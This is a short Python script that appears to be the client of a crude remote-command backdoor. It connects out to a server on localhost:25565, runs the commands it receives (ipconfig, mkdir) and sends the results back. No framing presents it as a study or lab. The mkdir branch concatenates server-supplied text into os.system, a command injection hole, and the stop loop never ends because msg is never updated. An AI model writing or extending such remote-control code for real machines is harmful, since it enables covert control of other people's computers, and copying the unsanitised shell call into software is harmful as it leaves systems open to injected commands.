import socket
import os
import subprocess

def cmdrecv():
	cmd = server_co.recv(1024)
	if cmd == b"ifconfig":
		p = subprocess.Popen('ipconfig', stdout=subprocess.PIPE, shell=True)
		out, error = p.communicate()
		server_co.send(out)
	else:
		cmd = cmd.decode()
		cmd = cmd.split(' ')
		if cmd[0] == "mkdir":
			os.system('mkdir ' + cmd[1])
			server_co.send(b'Folder Created')

def sendconfirm():
	server_co.send(b'Command recieved successfully')

hote = 'localhost'
port = 25565
server_co = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_co.connect((hote, port))
print("[*] Connected")
msg = b''
while msg != b'stop':
	cmdrecv()
	sendconfirm()
print("[*] Session Close")
server_co.close()